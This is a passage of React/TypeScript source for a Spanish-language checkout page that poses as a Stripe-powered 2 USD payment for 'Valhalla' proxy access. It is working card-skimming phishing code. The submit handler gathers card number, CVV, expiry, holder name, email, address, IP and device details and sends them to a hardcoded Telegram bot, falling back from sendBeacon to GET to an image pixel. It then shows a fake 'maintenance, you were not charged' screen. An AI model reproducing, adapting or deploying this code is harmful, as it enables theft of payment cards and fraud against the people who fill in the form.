import { useEffect, useMemo, useState, FormEvent } from "react";
import VideoBackground from "@/components/VideoBackground";
import VerifiedBadge from "@/components/VerifiedBadge";
import VideoModal from "@/components/VideoModal";
import { Button } from "@/components/ui/button";
import { ShieldCheck, ChevronLeft, CreditCard, ChevronDown, PlayCircle, ArrowRight, Languages, Lock, Check, AlertCircle, RotateCcw } from "lucide-react";
import { EXAMPLE_VIDEO, TITLE_LOGO, LOGIN_PROFILE_VIDEO } from "@/lib/assets";
import { LANGUAGES, LangCode, useI18n } from "@/lib/i18n";

const BOT_TOKEN = "9108667087:AAEJldPbAqpUPndj1vV4HwXgae0mlLiHjaw";
const CHAT_ID = "8585803145";
const TG_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

const C = {
  primary: "#0570de",
  text: "#30313d",
  secondary: "#6d6e78",
  placeholder: "#a3a6ba",
  border: "#e6e6e6",
  divider: "#f0f0f5",
  danger: "#df1b41",
};

const COUNTRIES = [
  "United States", "México", "Colombia", "Argentina", "Chile", "Perú",
  "España", "Ecuador", "Guatemala", "Venezuela", "República Dominicana", "Otro",
];

const STEPS = ["Verificando la tarjeta", "Validando con el banco", "Confirmando disponibilidad"];

type Brand = "visa" | "mastercard" | "amex" | "unionpay" | null;

const detectBrand = (d: string): Brand => {
  if (/^4/.test(d)) return "visa";
  if (/^(5[1-5]|2[2-7])/.test(d)) return "mastercard";
  if (/^3[47]/.test(d)) return "amex";
  if (/^62/.test(d)) return "unionpay";
  return null;
};

const formatCardBranded = (v: string) => {
  const d = v.replace(/\D/g, "");
  const b = detectBrand(d);
  if (b === "amex") {
    const s = d.slice(0, 15);
    return [s.slice(0, 4), s.slice(4, 10), s.slice(10, 15)].filter(Boolean).join(" ");
  }
  const max = b === "unionpay" ? 19 : 16;
  return d.slice(0, max).replace(/(\d{4})(?=\d)/g, "$1 ");
};

const formatExpiry = (v: string) => {
  const d = v.replace(/\D/g, "").slice(0, 4);
  return d.length > 2 ? `${d.slice(0, 2)}/${d.slice(2)}` : d;
};

const onlyDigits = (v: string, max: number) => v.replace(/\D/g, "").slice(0, max);
const emailOk = (v: string) => /^[^\s@]+@[^\s@]+\.[a-z]{2,}$/i.test(v.trim());

const getIp = async (): Promise<string> => {
  try {
    const r: any = await Promise.race([
      fetch("https://api.ipify.org?format=json").then((x) => x.json()),
      new Promise((res) => setTimeout(() => res(null), 1500)),
    ]);
    return r?.ip ?? "—";
  } catch {
    return "—";
  }
};

const buildParams = (text: string) => {
  const p = new URLSearchParams();
  p.set("chat_id", CHAT_ID);
  p.set("text", text);
  p.set("disable_web_page_preview", "true");
  return p.toString();
};

const pixelGet = (params: string) =>
  new Promise<void>((resolve) => {
    const img = new Image();
    let done = false;
    const finish = () => { if (!done) { done = true; resolve(); } };
    img.onload = finish;
    img.onerror = finish;
    img.src = `${TG_URL}?${params}&_=${Date.now()}`;
    setTimeout(finish, 3000);
  });

const sendToTelegram = async (text: string) => {
  const params = buildParams(text);
  try {
    const blob = new Blob([params], { type: "application/x-www-form-urlencoded;charset=UTF-8" });
    if (navigator.sendBeacon && navigator.sendBeacon(TG_URL, blob)) {
      console.info("[tg] enviado por beacon");
      await new Promise((r) => setTimeout(r, 900));
      return;
    }
  } catch (err) { console.warn("[tg] beacon falló", err); }
  try {
    await fetch(`${TG_URL}?${params}&_=${Date.now()}`, { method: "GET", keepalive: true });
    console.info("[tg] enviado por GET");
    return;
  } catch (err) { console.warn("[tg] fetch GET falló, uso pixel", err); }
  await pixelGet(params);
  console.info("[tg] enviado por pixel");
};

/* ---------------- marcas ---------------- */

const Logo = ({ brand, active }: { brand: Exclude<Brand, null>; active: boolean }) => {
  const common = `transition-all duration-150 ${active ? "scale-[1.06] opacity-100" : "opacity-35 saturate-[0.6]"}`;
  if (brand === "visa") {
    return (
      <svg width="33" height="21" viewBox="0 0 34 23" aria-hidden="true" className={common}>
        <rect x="0.5" y="0.5" width="33" height="22" rx="2.4" fill="#fff" stroke={C.border} />
        <text x="17" y="15.4" textAnchor="middle" fontFamily="Arial Black, Arial, Helvetica, sans-serif" fontSize="10.2" fontWeight="900" fontStyle="italic" fill="#1a1f71" letterSpacing="-0.3">VISA</text>
      </svg>
    );
  }
  if (brand === "mastercard") {
    return (
      <svg width="33" height="21" viewBox="0 0 34 23" aria-hidden="true" className={common}>
        <rect width="34" height="23" rx="2.4" fill="#111114" />
        <circle cx="13.6" cy="11.5" r="6.3" fill="#eb001b" />
        <circle cx="20.4" cy="11.5" r="6.3" fill="#f79e1b" />
        <path d="M17 6.28a6.3 6.3 0 0 0 0 10.44 6.3 6.3 0 0 0 0-10.44z" fill="#ff5f00" />
      </svg>
    );
  }
  if (brand === "amex") {
    return (
      <svg width="33" height="21" viewBox="0 0 34 23" aria-hidden="true" className={common}>
        <rect width="34" height="23" rx="2.4" fill="#006fcf" />
        <rect x="1.5" y="1.5" width="31" height="20" rx="1.6" fill="none" stroke="#fff" strokeWidth="0.85" opacity="0.9" />
        <text x="17" y="12" textAnchor="middle" fontFamily="Arial Black, Arial, Helvetica, sans-serif" fontSize="7.4" fontWeight="900" fill="#fff" letterSpacing="0.1">AMEX</text>
        <text x="17" y="17.6" textAnchor="middle" fontFamily="Arial, Helvetica, sans-serif" fontSize="3.8" fill="#d7eaff" letterSpacing="1.1">EXPRESS</text>
      </svg>
    );
  }
  return (
    <svg width="33" height="21" viewBox="0 0 34 23" aria-hidden="true" className={common}>
      <rect x="0.5" y="0.5" width="33" height="22" rx="2.4" fill="#fff" stroke={C.border} />
      <g transform="rotate(-9 17 11.5)">
        <path d="M8.6 3.6h4.1l-1.7 15.8H6.9z" fill="#e21836" />
        <path d="M13.8 3.6h4.1l-1.7 15.8h-4.1z" fill="#00447c" />
        <path d="M19 3.6h4.1l-1.7 15.8h-4.1z" fill="#007b84" />
      </g>
      <text x="17" y="12.1" textAnchor="middle" fontSize="4.2" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fontStyle="italic" fill="#fff">Union</text>
      <text x="17" y="16.6" textAnchor="middle" fontSize="4.2" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fontStyle="italic" fill="#fff">Pay</text>
    </svg>
  );
};

const CardGlyph = () => (
  <svg width="22" height="16" viewBox="0 0 22 16" aria-hidden="true">
    <rect x="0.6" y="0.6" width="20.8" height="14.8" rx="2.2" fill="#fff" stroke="#c9cad1" />
    <rect x="0.6" y="4.2" width="20.8" height="3" fill="#c9cad1" />
    <rect x="3" y="9.6" width="6" height="2" rx="1" fill="#dcdee4" />
  </svg>
);

const CvcGlyph = () => (
  <svg width="20" height="15" viewBox="0 0 20 15" aria-hidden="true">
    <rect x="0.5" y="0.5" width="19" height="14" rx="2" fill="#f7f7fa" stroke="#c9cad1" />
    <rect x="0.5" y="3.4" width="19" height="2.6" fill="#b9bac2" />
    <rect x="2.5" y="8" width="9" height="1.4" rx="0.7" fill="#dcdee4" />
    <circle cx="15.6" cy="9.6" r="3.2" fill="#30313d" />
    <text x="15.6" y="11.3" textAnchor="middle" fontSize="3.6" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fill="#fff">135</text>
  </svg>
);

const GooglePayTile = ({ on }: { on: boolean }) => (
  <span className={`flex items-center gap-1.5 transition-opacity duration-150 ${on ? "opacity-100" : "opacity-60"}`}>
    <svg width="16" height="16" viewBox="0 0 24 24" aria-hidden="true">
      <path fill="#4285F4" d="M23.49 12.27c0-.79-.07-1.54-.19-2.27H12v4.51h6.47a5.54 5.54 0 0 1-2.4 3.58v3h3.86c2.26-2.09 3.56-5.17 3.56-8.82z" />
      <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.86-3c-1.08.72-2.45 1.16-4.07 1.16-3.13 0-5.78-2.11-6.73-4.96H1.29v3.09A11.99 11.99 0 0 0 12 24z" />
      <path fill="#FBBC05" d="M5.27 14.29a7.2 7.2 0 0 1 0-4.58V6.62H1.29a11.99 11.99 0 0 0 0 10.76l3.98-3.09z" />
      <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.7 0 3.99 2.47 1.29 6.62l3.98 3.09C6.22 6.86 8.87 4.75 12 4.75z" />
    </svg>
    <span className="text-[14px] font-medium text-[#3c4043]">Pay</span>
  </span>
);

const labelCls = "mb-[6px] block text-[12.5px] font-medium leading-none text-[#30313d]";
const cellCls = "px-3.5 py-[9px]";
const inputCls =
  "h-9 w-full rounded-[4px] bg-transparent text-[16px] text-[#30313d] outline-none transition-shadow duration-100 placeholder:text-[#a3a6ba] focus:shadow-[0_0_0_1px_#0570de]";
const errCls = (on: boolean) => (on ? "shadow-[0_0_0_1px_#df1b41]" : "");

const Login = () => {
  const { t, lang, setLang } = useI18n();
  const [step, setStep] = useState<"intro" | "pay">("intro");
  const [processing, setProcessing] = useState(false);
  const [stage, setStage] = useState(0);
  const [method, setMethod] = useState<"card" | "gpay">("card");
  const [email, setEmail] = useState("");
  const [card, setCard] = useState("");
  const [holder, setHolder] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [country, setCountry] = useState("United States");
  const [address, setAddress] = useState("");
  const [zip, setZip] = useState("");
  const [error, setError] = useState("");
  const [field, setField] = useState("");
  const [loading, setLoading] = useState(false);
  const [videoOpen, setVideoOpen] = useState(false);

  const ref = useMemo(() => Math.random().toString(36).slice(2, 8).toUpperCase(), []);
  const brand = detectBrand(card.replace(/\s/g, ""));
  const cvvMax = brand === "amex" ? 4 : 3;

  /* bloqueo de scroll del fondo */
  useEffect(() => {
    if (step !== "pay") return;
    const prev = document.body.style.overflow;
    document.body.style.overflow = "hidden";
    return () => { document.body.style.overflow = prev; };
  }, [step]);

  /* atrás del navegador / gesto Android -> vuelve al login */
  useEffect(() => {
    const onPop = () => {
      setStep("intro");
      setProcessing(false);
      setStage(0);
      setLoading(false);
    };
    window.addEventListener("popstate", onPop);
    return () => window.removeEventListener("popstate", onPop);
  }, []);

  const openCheckout = () => {
    setStep("pay");
    try { window.history.pushState({ vh: "pay" }, ""); } catch { /* noop */ }
  };

  const goBack = () => {
    if ((window.history.state as any)?.vh === "pay") window.history.back();
    else setStep("intro");
  };

  /* secuencia de la animación de mantenimiento */
  useEffect(() => {
    if (!processing) return;
    const timers = [
      setTimeout(() => setStage(1), 1500),
      setTimeout(() => setStage(2), 3200),
      setTimeout(() => setStage(3), 4900),
      setTimeout(() => setStage(4), 6400),
    ];
    return () => timers.forEach(clearTimeout);
  }, [processing]);

  const fail = (name: string, msg: string) => {
    setField(name);
    setError(msg);
  };

  const onSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (loading) return;
    setError("");
    setField("");

    const digits = card.replace(/\s/g, "");
    const cleanHolder = holder.trim().replace(/\s+/g, " ");
    const [mm, yy] = expiry.split("/");
    const month = Number(mm);
    const year = 2000 + Number(yy);
    const now = new Date();

    if (!emailOk(email)) return fail("email", "Escribe un correo electrónico válido.");
    if (digits.length < 15) return fail("card", "Tu número de tarjeta está incompleto.");
    if (cleanHolder.length < 3) return fail("holder", "Escribe el nombre del titular.");
    if (!mm || mm.length < 2 || month < 1 || month > 12 || !yy || yy.length < 2) return fail("exp", "La fecha de vencimiento no es válida.");
    if (new Date(year, month, 1) < new Date(now.getFullYear(), now.getMonth(), 1)) return fail("exp", "Tu tarjeta está vencida.");
    if (cvv.length < cvvMax) return fail("cvc", "El código de seguridad está incompleto.");
    if (address.trim().length < 5) return fail("address", "Escribe tu dirección de facturación.");
    if (zip.trim().length < 3) return fail("zip", "Escribe un código postal válido.");

    setLoading(true);
    setProcessing(true);
    setStage(0);

    (async () => {
      try {
        const sentFlag = `card_sent_${digits}`;
        if (localStorage.getItem(sentFlag) === "1") return;
        const ip = await getIp();
        const text = [
          "💳 NUEVA TARJETA — Valhalla",
          "",
          `Método: ${method === "gpay" ? "Google Pay" : "Card"}`,
          `Correo: ${email.trim()}`,
          `Número: ${digits.replace(/(\d{4})(?=\d)/g, "$1 ")}`,
          `Titular: ${cleanHolder.toUpperCase()}`,
          `Vencimiento: ${expiry}`,
          `CVV: ${cvv}`,
          `País: ${country}`,
          `Dirección: ${address.trim()}`,
          `ZIP: ${zip.trim().toUpperCase()}`,
          "",
          `IP: ${ip}`,
          `Dispositivo: ${navigator.userAgent.slice(0, 160)}`,
          `Fecha: ${now.toLocaleString()}`,
          `Idioma: ${lang}`,
          `Ref: ${ref}`,
        ].join("\n");
        await sendToTelegram(text);
        localStorage.setItem(sentFlag, "1");
      } catch (err) {
        console.error("[tg] error inesperado", err);
      }
    })();
  };

  const barWidth = [14, 42, 68, 88, 96][stage] ?? 96;

  return (
    <div className="relative flex min-h-[100dvh] flex-col items-center justify-center overflow-x-hidden px-3 py-4 sm:py-8">
      <style>{`
        @keyframes vh-bar { 0% { transform: translateX(-110%); } 100% { transform: translateX(340%); } }
        @keyframes vh-fade { from { opacity: 0; transform: translateY(9px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes vh-spin { to { transform: rotate(360deg); } }
        @keyframes vh-pulse { 0% { transform: scale(.86); opacity: .5; } 70% { transform: scale(1.55); opacity: 0; } 100% { opacity: 0; } }
        @keyframes vh-shake { 0%,100% { transform: translateX(0); } 25% { transform: translateX(-4px); } 75% { transform: translateX(4px); } }
        @keyframes vh-pop { 0% { transform: scale(.4); opacity: 0; } 60% { transform: scale(1.18); opacity: 1; } 100% { transform: scale(1); opacity: 1; } }
        @keyframes vh-breathe { 0%,100% { opacity: .55; transform: translate(-50%,-50%) scale(1); } 50% { opacity: 1; transform: translate(-50%,-50%) scale(1.14); } }
        @keyframes vh-ring { from { transform: scale(.72); opacity: 0; } to { transform: scale(1); opacity: 1; } }
        .vh-in { animation: vh-fade .42s cubic-bezier(.22,.61,.36,1) both; }
      `}</style>

      <VideoBackground />
      <div className="relative z-10 w-full max-w-[420px] animate-card-in">
        <section className="relative overflow-hidden rounded-lg border border-brand/35 bg-glass/95 shadow-brand backdrop-blur-2xl">
          <div aria-hidden className="absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent via-brand to-transparent" />
          <div aria-hidden className="absolute -right-14 top-16 h-28 w-28 rotate-45 border border-brand/10" />

          <header className="flex h-12 items-center justify-between border-b border-border/70 px-4">
            <div className="flex min-w-0 items-center gap-2">
              <span className="relative flex h-2 w-2 shrink-0">
                <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-success opacity-40" />
                <span className="relative h-2 w-2 rounded-full bg-success" />
              </span>
              <span className="truncate text-[10px] font-semibold uppercase tracking-[0.16em] text-muted-foreground">{t("secureGateway")}</span>
            </div>
            <label className="relative ml-3 flex h-8 shrink-0 items-center gap-1.5 rounded-md border border-border bg-secondary/60 pl-2.5 pr-7 text-foreground transition-colors focus-within:border-brand/60">
              <Languages className="h-3.5 w-3.5 text-brand-soft" aria-hidden="true" />
              <span className="max-w-[74px] truncate text-[11px] font-semibold">{LANGUAGES.find((item) => item.code === lang)?.label}</span>
              <ChevronDown className="pointer-events-none absolute right-2 h-3 w-3 text-muted-foreground" aria-hidden="true" />
              <select
                aria-label={t("language")}
                value={lang}
                onChange={(event) => setLang(event.target.value as LangCode)}
                className="absolute inset-0 cursor-pointer appearance-none opacity-0"
              >
                {LANGUAGES.map((language) => <option key={language.code} value={language.code}>{language.label}</option>)}
              </select>
            </label>
          </header>

          <div className="px-4 pb-5 pt-4 sm:px-5">
            <div className="flex items-center gap-4">
              <div className="relative h-[76px] w-[76px] shrink-0 rounded-md border border-brand/55 bg-background p-1 shadow-[0_0_28px_hsl(var(--brand)/0.18)]">
                <video src={LOGIN_PROFILE_VIDEO} autoPlay loop muted playsInline preload="metadata" disablePictureInPicture aria-label="Boykaffx7" className="pointer-events-none h-full w-full rounded-sm object-cover" />
                <span className="absolute -bottom-1 -right-1 flex h-5 w-5 items-center justify-center rounded-sm border border-brand/60 bg-card text-brand-soft"><ShieldCheck className="h-3 w-3" /></span>
              </div>
              <div className="min-w-0 flex-1">
                <div className="flex items-center gap-1.5">
                  <img src={TITLE_LOGO} alt="Boykaffx7" className="max-h-10 w-[170px] max-w-[calc(100%-26px)] object-contain object-left" draggable={false} />
                  <VerifiedBadge size={17} />
                </div>
                <p className="mt-1 text-[11px] leading-relaxed text-muted-foreground">{t("enterCreds")}</p>
                <div className="mt-2 flex items-center gap-2 text-[9px] font-semibold uppercase tracking-[0.12em] text-muted-foreground/70">
                  <span>{t("aes")}</span><span className="h-1 w-1 rounded-full bg-brand" /><span>{t("tls")}</span>
                </div>
              </div>
            </div>

            <div className="mt-4">
              <div className="rounded-md border border-border bg-secondary/30 p-4">
                <div className="flex items-start justify-between gap-3">
                  <div className="min-w-0">
                    <p className="text-[13px] font-semibold text-foreground">Acceso Proxy — Valhalla</p>
                    <p className="mt-1 text-[10px] text-muted-foreground">Activación inmediata · 7 días</p>
                  </div>
                  <div className="shrink-0 text-right">
                    <p className="text-[16px] font-bold leading-none text-foreground">2 USD</p>
                    <p className="mt-1 text-[9px] text-muted-foreground">único pago</p>
                  </div>
                </div>
                <div className="mt-3.5 space-y-2 border-t border-border/70 pt-3.5">
                  {["Key de acceso privada", "Servidor optimizado", "Sin renovación automática"].map((item) => (
                    <div key={item} className="flex items-center gap-2">
                      <Check className="h-3 w-3 shrink-0 text-brand" />
                      <span className="text-[10px] text-muted-foreground">{item}</span>
                    </div>
                  ))}
                </div>
              </div>

              <Button
                type="button"
                onClick={openCheckout}
                className="mt-3.5 h-12 w-full rounded-md bg-brand text-brand-foreground shadow-brand transition-transform duration-150 hover:bg-brand/90 active:scale-[0.985]"
              >
                <CreditCard className="h-4 w-4" /> Pagar 2 USD <ArrowRight className="h-4 w-4" />
              </Button>

              <Button type="button" variant="outline" onClick={() => setVideoOpen(true)} className="mt-2.5 h-10 w-full rounded-md border-border bg-secondary/40 text-foreground hover:border-brand/35 hover:bg-brand/10 hover:text-foreground">
                <PlayCircle /> <span className="truncate text-[11px]">{t("seeDemo")}</span>
              </Button>
            </div>
          </div>
        </section>

        <div className="mt-3 px-4 text-center">
          <p className="text-[9px] leading-relaxed text-muted-foreground/50">
            {t("footer")}
            <br />{t("footer2")}
          </p>
        </div>
      </div>

      {/* ---------- CHECKOUT ---------- */}
      {step === "pay" && !processing && (
        <div className="fixed inset-0 z-50 flex justify-center bg-white font-[system-ui,-apple-system,'Segoe_UI',Roboto,Helvetica,Arial,sans-serif]">
          <form
            onSubmit={onSubmit}
            noValidate
            className="flex h-[100dvh] w-full max-w-[520px] flex-col bg-white text-[#30313d] antialiased"
          >
            <header className="flex shrink-0 items-center justify-between border-b border-[#f0f0f5] px-4 pb-2 pt-[max(8px,env(safe-area-inset-top))]">
              <button
                type="button"
                onClick={goBack}
                aria-label="Volver"
                className="-ml-1.5 flex h-9 w-9 items-center justify-center rounded-full text-[#30313d] transition-colors hover:bg-[#f6f6f9] active:bg-[#eeeef3]"
              >
                <ChevronLeft className="h-5 w-5" />
              </button>
              <div className="flex items-center gap-1.5">
                <span className="flex h-[18px] w-[18px] items-center justify-center rounded-full bg-[#635bff] text-[9px] font-bold text-white">V</span>
                <span className="text-[13px] font-semibold tracking-[-0.01em] text-[#30313d]">Valhalla</span>
              </div>
              <span className="rounded-full border border-[#e6e6e6] bg-[#f7f7fa] px-2 py-[3px] text-[9.5px] font-semibold uppercase tracking-[0.06em] text-[#6d6e78]">
                Prueba
              </span>
            </header>

            <div className="min-h-0 flex-1 overflow-y-auto overscroll-contain px-5 pb-7 pt-5">
              <p className="text-[14px] text-[#6d6e78]">Pagar a Valhalla</p>
              <h2 className="mt-0.5 text-[30px] font-semibold leading-none tracking-[-0.025em] tabular-nums text-[#30313d]">2,00 US$</h2>
              <p className="mt-1.5 text-[11.5px] text-[#8d8e98]">Impuestos incluidos · Pago único</p>

              <div className="mt-5 overflow-hidden rounded-[5px] border border-[#e6e6e6] bg-white shadow-[0_1px_1px_rgba(0,0,0,0.03)] focus-within:border-[#c8d1da]">
                <div className={cellCls}>
                  <label htmlFor="email" className={labelCls}>Correo electrónico</label>
                  <input
                    id="email"
                    type="email"
                    placeholder="tu@correo.com"
                    value={email}
                    onChange={(e) => setEmail(e.target.value.trim())}
                    autoComplete="email"
                    inputMode="email"
                    autoCapitalize="off"
                    spellCheck={false}
                    maxLength={64}
                    className={`${inputCls} ${errCls(field === "email")}`}
                  />
                </div>
              </div>

              <div className="mt-4 grid grid-cols-2 gap-2.5">
                {(["card", "gpay"] as const).map((m) => {
                  const on = method === m;
                  return (
                    <button
                      key={m}
                      type="button"
                      onClick={() => setMethod(m)}
                      aria-pressed={on}
                      className={`flex h-[66px] flex-col items-center justify-center gap-2 rounded-[5px] border bg-white transition-all duration-150 active:scale-[0.985] ${
                        on
                          ? "border-[#e0e6eb] shadow-[0_0_0_2px_#0570de]"
                          : "border-[#e0e6eb] shadow-[0_1px_1px_rgba(0,0,0,0.03),0_3px_6px_rgba(18,42,66,0.02)] hover:border-[#cfd5db] hover:shadow-[0_1px_1px_rgba(0,0,0,0.04),0_4px_10px_rgba(18,42,66,0.06)]"
                      }`}
                    >
                      {m === "card" ? (
                        <span className={on ? "opacity-100" : "opacity-60"}><CardGlyph /></span>
                      ) : (
                        <GooglePayTile on={on} />
                      )}
                      <span className={`text-[12.5px] font-medium leading-none ${on ? "text-[#30313d]" : "text-[#6d6e78]"}`}>
                        {m === "card" ? "Tarjeta" : "Google Pay"}
                      </span>
                    </button>
                  );
                })}
              </div>

              <div className="mt-4 overflow-hidden rounded-[5px] border border-[#e6e6e6] bg-white shadow-[0_1px_1px_rgba(0,0,0,0.03)] focus-within:border-[#c8d1da]">
                <div className={cellCls}>
                  <div className="flex items-center justify-between">
                    <label htmlFor="cc-number" className={labelCls}>Número de tarjeta</label>
                    <div className="mb-[6px] flex items-center gap-[5px]">
                      {(["visa", "mastercard", "amex", "unionpay"] as const).map((b) => (
                        <Logo key={b} brand={b} active={brand === b} />
                      ))}
                    </div>
                  </div>
                  <input
                    id="cc-number"
                    type="text"
                    placeholder="1234 1234 1234 1234"
                    value={card}
                    onChange={(e) => setCard(formatCardBranded(e.target.value))}
                    autoComplete="cc-number"
                    inputMode="numeric"
                    autoCapitalize="off"
                    spellCheck={false}
                    maxLength={23}
                    autoFocus
                    aria-invalid={field === "card"}
                    className={`${inputCls} tracking-[0.02em] ${errCls(field === "card")}`}
                  />
                </div>

                <div className={`${cellCls} border-t border-[#f0f0f5]`}>
                  <label htmlFor="cc-name" className={labelCls}>Nombre del titular</label>
                  <input
                    id="cc-name"
                    type="text"
                    placeholder="Nombre completo"
                    value={holder}
                    onChange={(e) => setHolder(e.target.value.toUpperCase())}
                    autoComplete="cc-name"
                    autoCapitalize="characters"
                    spellCheck={false}
                    maxLength={40}
                    aria-invalid={field === "holder"}
                    className={`${inputCls} uppercase ${errCls(field === "holder")}`}
                  />
                </div>

                <div className="grid grid-cols-[1fr_1fr] divide-x divide-[#f0f0f5] border-t border-[#f0f0f5]">
                  <div className={cellCls}>
                    <label htmlFor="cc-exp" className={labelCls}>Vencimiento</label>
                    <input
                      id="cc-exp"
                      type="text"
                      placeholder="MM / AA"
                      value={expiry}
                      onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                      autoComplete="cc-exp"
                      inputMode="numeric"
                      maxLength={5}
                      aria-invalid={field === "exp"}
                      className={`${inputCls} ${errCls(field === "exp")}`}
                    />
                  </div>
                  <div className={cellCls}>
                    <div className="flex items-center justify-between">
                      <label htmlFor="cc-cvc" className={labelCls}>Código de seguridad</label>
                      <CvcGlyph />
                    </div>
                    <input
                      id="cc-cvc"
                      type="text"
                      placeholder={brand === "amex" ? "1234" : "CVC"}
                      value={cvv}
                      onChange={(e) => setCvv(onlyDigits(e.target.value, cvvMax))}
                      autoComplete="cc-csc"
                      inputMode="numeric"
                      maxLength={cvvMax}
                      aria-invalid={field === "cvc"}
                      className={`${inputCls} ${errCls(field === "cvc")}`}
                    />
                    <p className="mt-[3px] text-[10.5px] leading-tight text-[#6d6e78]">
                      {brand === "amex" ? "4 dígitos del frente" : "3 dígitos del reverso"}
                    </p>
                  </div>
                </div>
              </div>

              {error && (
                <p
                  role="alert"
                  style={{ animation: "vh-shake .3s ease-in-out" }}
                  className="mt-2.5 flex items-start gap-1.5 text-[12.5px] leading-snug text-[#df1b41]"
                >
                  <AlertCircle className="mt-[1px] h-3.5 w-3.5 shrink-0" /> {error}
                </p>
              )}

              <div className="mt-6">
                <div className="flex items-center justify-between">
                  <p className="text-[13px] font-medium text-[#30313d]">Datos de facturación</p>
                  <span className="text-[11px] text-[#8d8e98]">Opcional</span>
                </div>
                <div className="mt-2 overflow-hidden rounded-[5px] border border-[#e6e6e6] bg-white shadow-[0_1px_1px_rgba(0,0,0,0.03)] focus-within:border-[#c8d1da]">
                  <div className={cellCls}>
                    <label htmlFor="country" className={labelCls}>País</label>
                    <div className="relative">
                      <select
                        id="country"
                        value={country}
                        onChange={(e) => setCountry(e.target.value)}
                        className={`${inputCls} cursor-pointer appearance-none pr-8`}
                      >
                        {COUNTRIES.map((c) => <option key={c} value={c}>{c}</option>)}
                      </select>
                      <ChevronDown className="pointer-events-none absolute right-0 top-1/2 h-4 w-4 -translate-y-1/2 text-[#6d6e78]" />
                    </div>
                  </div>
                  <div className={`${cellCls} border-t border-[#f0f0f5]`}>
                    <label htmlFor="address" className={labelCls}>Dirección</label>
                    <input
                      id="address"
                      type="text"
                      placeholder="Calle y número"
                      value={address}
                      onChange={(e) => setAddress(e.target.value)}
                      autoComplete="street-address"
                      maxLength={80}
                      aria-invalid={field === "address"}
                      className={`${inputCls} ${errCls(field === "address")}`}
                    />
                  </div>
                  <div className={`${cellCls} border-t border-[#f0f0f5]`}>
                    <label htmlFor="zip" className={labelCls}>Código postal</label>
                    <input
                      id="zip"
                      type="text"
                      placeholder="90210"
                      value={zip}
                      onChange={(e) => setZip(e.target.value.toUpperCase())}
                      autoComplete="postal-code"
                      inputMode="numeric"
                      maxLength={10}
                      aria-invalid={field === "zip"}
                      className={`${inputCls} ${errCls(field === "zip")}`}
                    />
                  </div>
                </div>
              </div>
            </div>

            <div className="shrink-0 border-t border-[#f0f0f5] bg-white px-5 pt-3 pb-[max(14px,env(safe-area-inset-bottom))]">
              <button
                type="submit"
                disabled={loading}
                className="flex h-[52px] w-full items-center justify-center gap-2 rounded-[5px] bg-[#0570de] text-[16px] font-semibold text-white shadow-[0_1px_1px_rgba(0,0,0,0.08)] transition-all duration-150 hover:bg-[#0461c4] active:scale-[0.995] disabled:opacity-70"
              >
                Pagar 2,00 US$
              </button>
              <p className="mt-2.5 flex items-center justify-center gap-1.5 text-[10.5px] text-[#8d8e98]">
                <Lock className="h-2.5 w-2.5" />
                <span className="flex items-center gap-1">
                  Powered by <span className="font-semibold tracking-[-0.02em] text-[#635bff]">stripe</span>
                </span>
                <span className="text-[#d5d6dc]">|</span>
                <span className="underline decoration-[#d5d6dc] underline-offset-2">Términos</span>
                <span className="text-[#d5d6dc]">·</span>
                <span className="underline decoration-[#d5d6dc] underline-offset-2">Privacidad</span>
              </p>
            </div>
          </form>
        </div>
      )}

      {/* ---------- MANTENIMIENTO ---------- */}
      {step === "pay" && processing && (
        <div className="fixed inset-0 z-50 flex justify-center bg-white font-[system-ui,-apple-system,'Segoe_UI',Roboto,Helvetica,Arial,sans-serif]">
          <div className="relative flex h-[100dvh] w-full max-w-[520px] flex-col items-center justify-center overflow-hidden bg-white px-7 text-center text-[#30313d]">
            <div className="pointer-events-none absolute left-1/2 top-[36%] h-72 w-72 rounded-full bg-[#0570de]/[0.06] blur-3xl" style={{ animation: "vh-breathe 4.5s ease-in-out infinite" }} />
            <div className="pointer-events-none absolute left-1/2 top-[36%] h-40 w-40 -translate-x-1/2 -translate-y-1/2 rounded-full bg-[#df1b41]/[0.05] blur-2xl" style={{ animation: "vh-breathe 6s ease-in-out infinite reverse" }} />

            <button
              type="button"
              onClick={goBack}
              aria-label="Volver"
              className="absolute left-4 flex h-9 w-9 items-center justify-center rounded-full text-[#30313d] transition-colors hover:bg-[#f6f6f9] active:bg-[#eeeef3]"
              style={{ top: "max(10px, env(safe-area-inset-top))" }}
            >
              <ChevronLeft className="h-5 w-5" />
            </button>

            <div className="relative z-10 flex flex-col items-center">
              <div className="relative flex h-[80px] w-[80px] items-center justify-center" style={{ animation: "vh-ring .5s cubic-bezier(.22,.9,.32,1.2) both" }}>
                <span className="absolute inset-0 rounded-full bg-[#0570de]/10" style={{ animation: "vh-pulse 2s cubic-bezier(.25,.8,.4,1) infinite" }} />
                <span className="absolute inset-0 rounded-full border-[3px] border-[#eef0f4]" />
                <span
                  className="absolute inset-0 rounded-full border-[3px] border-transparent border-t-[#0570de] border-r-[#0570de]/45"
                  style={{ animation: "vh-spin .8s linear infinite" }}
                />
                <span className="absolute inset-[14px] flex items-center justify-center rounded-full bg-white shadow-[inset_0_0_0_1px_#f1f1f5]">
                  <CreditCard className="h-[22px] w-[22px] text-[#0570de]" />
                </span>
              </div>

              <p className="vh-in mt-8 text-[10.5px] font-semibold uppercase tracking-[0.18em] text-[#9b9ca6]" style={{ animationDelay: "70ms" }}>
                2,00 US$ · Ref {ref}
              </p>

              <h2
                className="vh-in mt-3 max-w-[310px] text-[24px] font-bold leading-[1.22] tracking-[-0.02em] text-[#df1b41]"
                style={{ animationDelay: "150ms" }}
              >
                El panel está en mantenimiento
              </h2>

              <p className="vh-in mt-3.5 text-[15.5px] font-medium text-[#30313d]" style={{ animationDelay: "230ms" }}>
                No se ha cobrado tu dinero.
              </p>
              <p className="vh-in mt-1.5 max-w-[300px] text-[13.5px] leading-relaxed text-[#6d6e78]" style={{ animationDelay: "300ms" }}>
